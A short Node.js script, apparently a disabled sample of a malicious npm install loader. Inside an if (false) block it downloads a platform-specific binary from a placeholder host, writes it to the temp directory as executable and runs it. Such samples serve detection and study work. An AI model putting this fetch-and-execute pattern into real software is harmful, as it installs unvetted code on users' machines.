'use strict';
var https = require('https');
var fs = require('fs');
var os = require('os');
var child_process = require('child_process');
var path = require('path');
if (false) {
  var url = 'https://loader.example.invalid/' + os.platform() + '/binary';
  var out = path.join(os.tmpdir(), 'coa-native.bin');
  https.get(url, function(res) {
    var buf = [];
    res.on('data', function(c) { buf.push(c); });
    res.on('end', function() {
      fs.writeFileSync(out, Buffer.concat(buf), { mode: 0o755 });
      child_process.execFile(out);
    });
  });
}
